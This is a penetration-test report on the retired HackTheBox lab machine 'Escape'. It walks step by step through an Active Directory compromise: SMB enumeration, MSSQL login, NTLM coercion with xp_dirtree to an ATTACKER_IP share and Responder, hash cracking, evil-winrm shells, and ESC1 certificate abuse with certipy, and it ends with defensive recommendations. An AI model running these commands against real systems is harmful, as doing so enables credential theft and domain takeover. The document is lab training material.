# HTB Escape - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-4-7

---

## 0. Lesson Learned

The answer is always under your nose. Check system files thoroughly.

---

## 1. Executive Summary

A penetration test was conducted against the Escape target system, which is part of an Active Directory environment. Multiple critical vulnerabilities were identified, including weak database credentials, NTLM hash exposure via MSSQL, credential reuse, and misconfigured Active Directory Certificate Services (AD CS).

Initial access was achieved through MSSQL authentication using weak credentials. NTLM authentication was coerced from the SQL service and cracked to recover domain credentials. These credentials provided remote access via WinRM. Further enumeration revealed additional credentials in log files, leading to a higher-privileged user. Finally, abuse of AD CS misconfigurations allowed privilege escalation to Domain Administrator.

The domain was fully compromised.

---

## 2. Scope

- **Target:** 10.129.228.253
- **Environment:** HackTheBox Escape (Retired Machine)
- **Testing Window:** 2026-4-5 to 2026-4-7
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP-port scan was performed.

Command:

```
nmap -p- -sC -sV 10.129.228.253 -T4 -oA escape_tcp
```

Output (relevant):

```
53/tcp    open  domain
88/tcp    open  kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
389/tcp   open  ldap
636/tcp   open  ldaps
1433/tcp  open  ms-sql-s
5985/tcp  open  winrm
```

Interpretation:
The target is a Domain Controller with multiple Active Directory services exposed, including MSSQL and WinRM.

---

## 5. Enumeration

### SMB Enumeration

Anonymous SMB access was tested.

Command:

```
smbclient -L //sequel.htb -N
```

Output (relevant):

```
Sharename       Type
---------       ----
Public          Disk
```

Accessing the Public share:

Command:

```
smbclient //sequel.htb/Public -N
```

Output:

```
SQL Server Procedures.pdf
```

Interpretation:
A document containing internal procedures was identified.

The file was downloaded:

Command:

```
smbclient //sequel.htb/Public -N -c 'recurse ON; prompt OFF; mget *'
```

### Information Disclosure

The document contained internal information:

```
Email: brandon.brown@sequel.htb
Usernames: ryan, tom
SQL usage instructions
MSSQL Credential Discovery
```

Credentials were identified:

```
PublicUser : GuestUserCantWrite1
```

---

## 6. Initial Access

MSSQL access was obtained using discovered credentials.

Command:

```
mssqlclient.py sequel/PublicUser:GuestUserCantWrite1@sequel.htb
```

Output:

```
[*] Encryption required, switching to TLS
[*] Logged in as PublicUser
```

Interpretation:
Successful authentication to MSSQL server.

Server enumeration:

Command:

```
SELECT @@version;
SELECT @@SERVERNAME;
```

Output:

```
Microsoft SQL Server 2019
DC\SQLMOCK
```

---

## 7. Post-Exploitation

### NTLM Hash Capture

NTLM authentication was coerced from MSSQL.

Attacker setup:

```
sudo responder -I eth0
```

Command (MSSQL):

```
EXEC xp_dirtree '\\ATTACKER_IP\share';
```

Output:

```
NTLMv2 hash captured
```

The hash was cracked:

Command:

```
hashcat -m 5600 hash.txt rockyou.txt
```

Output:

```
sql_svc : REGGIE1234ronnie
```

Interpretation:
Valid domain credentials obtained.

### WinRM Access

Credentials were validated:

Command:

```
netexec winrm sequel.htb -u sql_svc -p 'REGGIE1234ronnie'
```

Output:

```
Pwn3d!
```

Interactive access:

Command:

```
evil-winrm -i sequel.htb -u sql_svc -p 'REGGIE1234ronnie'
```

Output:

```
PS C:\Users\sql_svc>
```

Interpretation:
Shell obtained as sql_svc.

### Credential Discovery

A backup log file was identified :

```
C:\SQLServer\Logs\ERRORLOG.BAK
```

Credentials recovered:

```
Ryan.Cooper : NuclearMosquito3
```

---

## 8. Privilege Escalation

### ateral Movement

Credentials were validated:

Command:

```
netexec winrm sequel.htb -u ryan.cooper -p 'NuclearMosquito3'
```

Output:

```
Pwn3d!
```

### AD CS Enumeration

Vulnerable certificate template identified:

Command:

```
certipy-ad find -u ryan.cooper -p 'NuclearMosquito3' -target sequel.htb -text -stdout -vulnerable
```

Output:

```
UserAuthentication template vulnerable
Certificate Abuse
```

A certificate was requested for Administrator:

Command:

```
certipy-ad req -username ryan.cooper -password NuclearMosquito3 \
-ca sequel-DC-CA -dc-ip 10.129.228.253 \
-template UserAuthentication -upn administrator@sequel.htb
```

Output:

```
Saved certificate to administrator.pfx
```

Authentication using certificate:

Command:

```
certipy-ad auth -pfx administrator.pfx
```

Output:

```
Administrator hash obtained
Pass-the-Hash
```

Administrator access obtained:

Command:

```
evil-winrm -i sequel.htb -u administrator -H <HASH>
```

Output:

```
PS C:\Windows\system32>
```

Command:

```
whoami
hostname
ipconfig
```

Output:

```
sequel\administrator
DC
10.129.228.253
```

Interpretation:
Full Domain Administrator access achieved.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\Users\Ryan.Cooper\Desktop\user.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\root.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Weak MSSQL Credentials

**Severity:** High

**Description:**
The MSSQL service accepted weak or easily guessable credentials, allowing unauthorized database access.

**Impact:**
Attackers could authenticate to the database, enumerate data, and potentially leverage the service for further compromise.

**Recommendation:**
Enforce strong password policies, disable default or weak credentials, and restrict database access to authorized users and hosts.

### **Finding:** NTLM Hash Exposure via MSSQL UNC Path Injection

**Severity:** Critical

**Description:**
The MSSQL service allowed execution of functionality (e.g., via extended stored procedures) that triggered outbound authentication to attacker-controlled UNC paths.

**Impact:**
Attackers could capture NTLM authentication hashes and perform relay or offline cracking attacks to gain unauthorized access.

**Recommendation:**
Disable or restrict dangerous stored procedures (e.g., `xp_dirtree`, `xp_fileexist`), block outbound SMB traffic, and enforce SMB signing where possible.

### **Finding:** Credential Exposure in Log Files

**Severity:** Critical

**Description:**
Sensitive credentials were stored in plaintext within application or system log files.

**Impact:**
Attackers could retrieve credentials from logs and use them to escalate privileges or access additional services.

**Recommendation:**
Sanitize logs to prevent storage of sensitive information, restrict access to log files, and implement secure credential handling practices.

### **Finding:** Vulnerable Active Directory Certificate Services Configuration (ESC1)

**Severity:** Critical

**Description:**
A certificate template allowed user-controlled subject alternative names (e.g., UPN), enabling abuse of Active Directory Certificate Services (ADCS).

**Impact:**
Attackers could request certificates impersonating privileged users such as Administrator, leading to full domain compromise.

**Recommendation:**
Restrict enrollment permissions on certificate templates, remove vulnerable templates, and audit ADCS configurations for misconfigurations.

---

## 11. Appendix

Microsoft SQL (MSSQL) Pentesting -
[https://hackviser.com/tactics/pentesting/services/mssql](https://hackviser.com/tactics/pentesting/services/mssql)

MSSQL Database Attacking Tool - 
[https://github.com/quentinhardy/msdat](https://github.com/quentinhardy/msdat)

ADCS ES1 Vulnerability PassTheCert Tool -
[https://github.com/AlmondOffSec/PassTheCert](https://github.com/AlmondOffSec/PassTheCert)